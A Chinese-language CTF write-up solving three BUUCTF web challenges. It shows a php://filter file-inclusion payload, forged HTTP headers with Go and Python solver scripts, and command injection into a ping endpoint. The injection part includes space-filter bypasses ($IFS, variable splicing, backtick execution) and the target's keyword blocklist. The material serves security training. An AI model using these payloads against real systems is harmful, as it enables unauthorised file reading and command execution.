# BUUCTF

#### [[ACTF2020 新生赛]Include](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Include)

加上`?file=php://filter/read=convert.base64-encode/resource=flag.php`，可以得到一串base64加密的数据`PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7ODc4ZjlkODEtZTY0NC00Njk4LWIzOGYtYjBiZTRlZjk5NzljfQo=`，解码就可以得到如下数据：

```php
<?php
echo "Can you find out the flag?";
//flag{878f9d81-e644-4698-b38f-b0be4ef9979c}
```

#### [[极客大挑战 2019]Http](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Http)

##### 解法1：BurpSuite

直接`view-source:http://node4.buuoj.cn:25280/`查看源码，可以找到这样一段代码：

```html
<div class="content">
  <h2>小组简介</h2>
  <p>·成立时间：2005年3月<br /><br />
     ·研究领域：渗透测试、逆向工程、密码学、IoT硬件安全、移动安全、安全编程、二进制漏洞挖掘利用等安全技术<br /><br />
     ·小组的愿望：致力于成为国内实力强劲和拥有广泛影响力的安全研究团队，为广大的在校同学营造一个良好的信息安全技术
     <a style="border:none;cursor:default;" onclick="return false" href="Secret.php">氛围</a>！
  </p>
</div>
```

点击`Secret.php`可以看到一行很大的文字`It doesn't come from 'https://www.Sycsecret.com'`。

`BurpSuite`抓包新增`Referer:www.Sycsecret.com`后又出现了一行新的文字，`Please use "Syclover" browser`。

继续用`BurpSuite`将`User-Agent`修改为 `Syclover`后又出现了一行新的文字`No!!! you can only read this locally!!!`。

用`BurpSuite`添加`X-Forwarded-For:127.0.0.1`后可以拿到`flag`。

##### 解法2：Golang

```go
package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

func httpRequest(url string) (*http.Response, error) {
	request, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	request.Header.Add("Referer", "https://www.Sycsecret.com")
	request.Header.Add("User-Agent", "Syclover")
	request.Header.Add("X-Forwarded-For", "127.0.0.1")
	client := http.Client{}
	return client.Do(request)
}

func main() {
	response, err := httpRequest("http://node4.buuoj.cn:25280/Secret.php")
	if err != nil {
		fmt.Printf("http get error: %s", err)
		return
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Printf("read error: %s", err)
	}
	fmt.Println(string(body))
}
```

##### 解法3：Python

```python
import requests
url = 'http://node4.buuoj.cn:25280/Secret.php'
headers={"Referer":"https://www.Sycsecret.com","Origin":"https://www.Sycsecret.com"}
headers['User-Agent'] = "Syclover"
headers['X-Forwarded-For'] = '127.0.0.1'
r = requests.get(url,headers=headers)
with open("1.html",'w')as f:
    f.write(r.text)
```

输出的`html`页面如下，可以看到`flag`：

```html
<!DOCTYPE html>
<html>

<style>
    .slickButton3 {
        margin-right:20px;
        margin-left:20px;
        margin-top:20px;
        margin-bottom:20px;
        color: white;
        font-weight: bold;
        padding: 10px;
        border: solid 1px black;
        background: #111111;
        cursor: pointer;
        transition: box-shadow 0.5s;
        -webkit-transition: box-shadow 0.5s;
    }

    .slickButton3:hover {
        box-shadow:4px 4px 8px #00FFFF;
    }
    img {
        position:absolute;
        left:20px;
        top:0px;
    }
    p {
        cursor: default;
    }
    .input{
        border: 1px solid #ccc;
        padding: 7px 0px;
        border-radius: 3px;
        padding-left:5px;
        -webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
        box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
        -webkit-transition: border-color ease-in-out .15s,-webkit-box-shadow ease-in-out .15s;
        -o-transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
        transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s
    }
    .input:hover{
        border-color: #808000;
        box-shadow: 0px 0px 8px #7CFC00;
    }  
</style>

<head>
        <meta charset="UTF-8">
        <title>SycSecret</title>
</head>
<body background="./images/background.png" style="background-repeat:no-repeat ;background-size:100% 100%; background-attachment: fixed;" >

</br></br></br></br></br></br></br></br></br></br></br></br>
<h1 style="font-family:arial;color:#8E44AD;font-size:50px;text-align:center;font-family:KaiTi;">
flag{2f1ec631-f839-4d42-8413-b790506989a7}
</h1>
<div style="position: absolute;bottom: 0;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
</body>
</html>
```

------

#### [[GXYCTF2019]Ping Ping Ping](https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping)

靶机给出的信息如下：

```
/?ip=
```

访问`/?ip=127.0.0.1`测试一下可以看到以下信息：

```bash
PING 127.0.0.1 (127.0.0.1): 56 data bytes
```

这是`Linux`命令执行，尝试使用管道符 `|` 来用`ls`显示当前目录的所有文件，访问`/?ip=127.0.0.1|ls`可以看到如下信息：

```
/?ip=
flag.php
index.php
```

直接`/?ip=127.0.0.1|cat flag.php`企图拿到`flag`，结果实际访问的是`/?ip=127.0.0.1|cat%20flag.php`，看到了如下信息：

```
/?ip= fxck your space!
```

艹被骂了，查阅资料后看到了一些输入空格的方法：

> $IFS	  //在这道题里不知道为什么不行
> ${IFS}
> $IFS$1 //$1改成$加其他数字都行
> <
> <>
> {cat,flag.php}  //用逗号实现了空格功能
> %20
> %09

访问`/?ip=127.0.0.1|cat$IFS$1flag.php`再次查看还是被骂，那看看另一个文件，`/?ip=127.0.0.1|cat$IFS$1index.php`，可以看到以下信息：

```php
/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}

?>
```

这怎么显示得不全？！`view-source`查看源码可以看到以下信息：

```php
/?ip=
<pre>/?ip=
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "<pre>";
  print_r($a);
}

?>
```

利用变量拼接绕过，可以拿到`flag`。

```
view-source:81def8b2-1bd9-4d67-9e1c-9f6b395b6b18.node4.buuoj.cn:81/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
```

看到一个大佬的解法：使用反引号`` 代替 | 内联执行，，将反引号内命令的输出作为输入执行，即把ls的结果作为cat的参数进行执行。

```
view-source:http://81def8b2-1bd9-4d67-9e1c-9f6b395b6b18.node4.buuoj.cn:81/?ip=127.0.0.1;cat$IFS$1`ls`
```

------
